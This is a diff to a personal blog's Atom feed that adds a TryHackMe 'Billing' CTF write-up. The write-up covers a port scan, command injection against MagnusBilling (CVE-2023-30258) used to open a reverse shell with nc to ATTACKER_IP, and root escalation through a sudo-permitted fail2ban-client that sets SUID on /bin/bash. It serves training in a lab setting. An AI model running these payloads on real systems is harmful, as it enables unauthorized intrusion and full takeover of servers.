@@ -2,9 +2,146 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
   <title>aviskase</title>
   <id>https://www.aviskase.com/</id>
-  <updated>2025-03-13T21:08:05Z</updated>
+  <updated>2025-04-17T04:46:09Z</updated>
   <link rel="self" type="application/atom+xml" href="https://www.aviskase.com/feeds/all.atom.xml" hreflang="en"/>
   <link rel="alternate" type="text/html" href="https://www.aviskase.com/" hreflang="en"/>
+  <entry>
+    <title>Writeup: TryHackMe Billing</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/04/17/writeup-tryhackme-billing/" hreflang="en"/>
+    <published>2025-04-17T04:46:09Z</published>
+    <updated>2025-04-17T04:46:09Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-04-17:/articles/2025/04/17/writeup-tryhackme-billing/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/billing" class="external-link">Billing</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: web, linux</li>
+</ul>
+<p>Gain a shell, find the way and escalate your privileges!
+Note: Bruteforcing is out of scope for this room.</p>
+<p>Answer the questions below</p>
+<ol>
+<li>What is user.txt?</li>
+<li>What is root.txt?</li>
+</ol>
+</div>
+<p>In this room I practiced exploiting CVEs and privilege escalation. Vulnerabilities explored:</p>
+<ul>
+<li>Command injection</li>
+<li>Sudoers misconfiguration</li>
+</ul>
+<nav class="callout toc" aria-label="Table of Contents">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a></li>
+    <li><a href="#user-flag-getting-reverse-shell-via-command-injection">User flag: getting reverse shell via command injection</a></li>
+    <li><a href="#root-flag-privilege-escalation-with-fail2ban-client">Root flag: privilege escalation with fail2ban-client</a></li>
+  </ol>
+</nav>
+</nav>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>As usual, first step, running a port scan:</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/billing" class="external-link">Billing</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: web, linux</li>
+</ul>
+<p>Gain a shell, find the way and escalate your privileges!
+Note: Bruteforcing is out of scope for this room.</p>
+<p>Answer the questions below</p>
+<ol>
+<li>What is user.txt?</li>
+<li>What is root.txt?</li>
+</ol>
+</div>
+<p>In this room I practiced exploiting CVEs and privilege escalation. Vulnerabilities explored:</p>
+<ul>
+<li>Command injection</li>
+<li>Sudoers misconfiguration</li>
+</ul>
+<nav class="callout toc" aria-label="Table of Contents">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a></li>
+    <li><a href="#user-flag-getting-reverse-shell-via-command-injection">User flag: getting reverse shell via command injection</a></li>
+    <li><a href="#root-flag-privilege-escalation-with-fail2ban-client">Root flag: privilege escalation with fail2ban-client</a></li>
+  </ol>
+</nav>
+</nav>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>As usual, first step, running a port scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -sV -T4 -n MACHINE_IP 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2025-03-07 17:23 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#cba6f7">for</span> MACHINE_IP
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.098s latency<span style="color:#89dceb;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#fab387">997</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>reset<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 <span style="color:#89dceb;font-weight:bold">(</span>protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.56 <span style="color:#89dceb;font-weight:bold">((</span>Debian<span style="color:#89dceb;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>3306/tcp open  mysql   MariaDB <span style="color:#89dceb;font-weight:bold">(</span>unauthorized<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>It detected SSH, HTTP, and mysql services.</p>
+<div class="callout note" role="note"aria-label="Note">
+    <p>I should have run it with <code>-p-</code> option, because I missed <a href="https://jaxafed.github.io/posts/tryhackme-billing/" class="external-link">open 5038 Asterisk port</a>.</p>
+</div>
+<p>I attempted to access mysql, but received an error &ldquo;Host is not allowed to connect to this MariaDB server&rdquo;.</p>
+<p>Web service is hosting a MagnusBilling service.</p>
+<p><figure aria-label="MagnusBilling login page showing service name in tab title">
+  <img
+    alt="MagnusBilling login page showing service name in tab title"
+    title="MagnusBilling login page showing service name in tab title"width="674"height="591"srcset="/articles/2025/04/17/writeup-tryhackme-billing/ctf_billing_hu_4b3328010c871c93.webp 420w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/04/17/writeup-tryhackme-billing/ctf_billing_hu_f043579b4580d13e.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<h2 id="user-flag-getting-reverse-shell-via-command-injection" >
+  <a href="#user-flag-getting-reverse-shell-via-command-injection">User flag: getting reverse shell via command injection</a>
+</h2>
+<p>Service seemed to me more complex than a simple bootstrapped CTF web site, so I searched for it and its known vulnerabilities.</p>
+<p>There is a <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-30258" class="external-link">CVE-2023-30258</a> command injection vulnerability in MagnusSolution MagnusBilling 6.x and 7.x. I confirmed it with a time-based blind command injection:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#a6e3a1">&#39;http://MACHINE_IP/mbilling/lib/icepay/icepay.php?democ=iamhacked;sleep%2015;#&#39;</span>
+</span></span></code></pre></div><p>Then I established a reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#a6e3a1">&#39;http://MACHINE_IP/mbilling/lib/icepay/icepay.php?democ=iamhacked;nc%20-c%20bash%20ATTACKER_IP%209003;&#39;</span> 
+</span></span></code></pre></div><p>And got a user key:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>asterisk@Billing$ cat /home/magnus/user.txt                   
+</span></span><span style="display:flex;"><span>THM<span style="color:#89dceb;font-weight:bold">{</span>REDACTED<span style="color:#89dceb;font-weight:bold">}</span>
+</span></span></code></pre></div><h2 id="root-flag-privilege-escalation-with-fail2ban-client" >
+  <a href="#root-flag-privilege-escalation-with-fail2ban-client">Root flag: privilege escalation with fail2ban-client</a>
+</h2>
+<p>To get the next flag I needed to have a root access. I did run <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" class="external-link">lienPEAS</a>, but also checked certain things manually, including <code>sudo -l</code>. It showed that current user can run <code>fail2ban-client</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>asterisk@Billing$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#cba6f7">for</span> asterisk on Billing:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, <span style="color:#f5e0dc">secure_path</span><span style="color:#89dceb;font-weight:bold">=</span>/usr/local/sbin<span style="color:#89b4fa">\:</span>/usr/local/bin<span style="color:#89b4fa">\:</span>/usr/sbin<span style="color:#89b4fa">\:</span>/usr/bin<span style="color:#89b4fa">\:</span>/sbin<span style="color:#89b4fa">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Runas and Command-specific defaults <span style="color:#cba6f7">for</span> asterisk:
+</span></span><span style="display:flex;"><span>    Defaults!/usr/bin/fail2ban-client !requiretty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User asterisk may run the following commands on Billing:
+</span></span><span style="display:flex;"><span>    <span style="color:#89dceb;font-weight:bold">(</span>ALL<span style="color:#89dceb;font-weight:bold">)</span> NOPASSWD: /usr/bin/fail2ban-client
+</span></span></code></pre></div><p><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-client-privilege-escalation/" class="external-link">Using this instruction</a> I added a new ban action to set SUID bit on <code>/bin/bash</code>, triggered it, got access to root shell, and got and the second flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>asterisk@Billing$ sudo /usr/bin/fail2ban-client status
+</span></span><span style="display:flex;"><span>Status
+</span></span><span style="display:flex;"><span>|- Number of jail:      <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e3a1">`</span>- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
+</span></span><span style="display:flex;"><span>asterisk@Billing$ sudo /usr/bin/fail2ban-client get asterisk-iptables  actions
+</span></span><span style="display:flex;"><span>The jail asterisk-iptables has the following actions:
+</span></span><span style="display:flex;"><span>iptables-allports-ASTERISK
+</span></span><span style="display:flex;"><span>asterisk@Billing$ sudo /usr/bin/fail2ban-client <span style="color:#89dceb">set</span> asterisk-iptables addaction evil
+</span></span><span style="display:flex;"><span>evil
+</span></span><span style="display:flex;"><span>asterisk@Billing$ sudo /usr/bin/fail2ban-client <span style="color:#89dceb">set</span> asterisk-iptables action evil actionban <span style="color:#a6e3a1">&#34;chmod +s /bin/bash&#34;</span>
+</span></span><span style="display:flex;"><span>chmod +s /bin/bash
+</span></span><span style="display:flex;"><span>asterisk@Billing$ sudo /usr/bin/fail2ban-client <span style="color:#89dceb">set</span> asterisk-iptables banip 1.2.3.5 
+</span></span><span style="display:flex;"><span><span style="color:#fab387">1</span>
+</span></span><span style="display:flex;"><span>asterisk@Billing$ /bin/bash -p
+</span></span><span style="display:flex;"><span>bash-5.1# cat /root/root.txt
+</span></span><span style="display:flex;"><span>THM<span style="color:#89dceb;font-weight:bold">{</span>REDACTED<span style="color:#89dceb;font-weight:bold">}</span>
+</span></span></code></pre></div>]]></content>
+  </entry>
   <entry>
     <title>Writeup: TryHackMe El Bandito</title>
     <link rel="alternate" href="https://www.aviskase.com/articles/2025/03/13/writeup-tryhackme-el-bandito/" hreflang="en"/>
